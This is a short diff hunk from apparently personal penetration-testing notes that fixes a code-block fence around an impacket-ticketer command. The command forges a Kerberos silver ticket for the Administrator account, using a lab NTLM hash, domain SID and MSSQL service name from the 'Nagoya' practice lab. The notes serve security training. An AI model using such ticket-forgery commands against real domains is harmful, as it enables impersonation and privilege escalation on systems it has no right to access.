@@ -2889,7 +2889,7 @@ ps> whoami /user
 - Forging silver ticket Ft **impacket-ticketer siver ticket**
 - Reference from the Nagoya PGpractice
 
-````powershell
+```powershell
 # impacket-ticketer -nthash ,NTLM> -domain-sid <SID> -domain nagoya-industries.com -spn <SPN> -user-id 500 Administrator
 impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
 ```
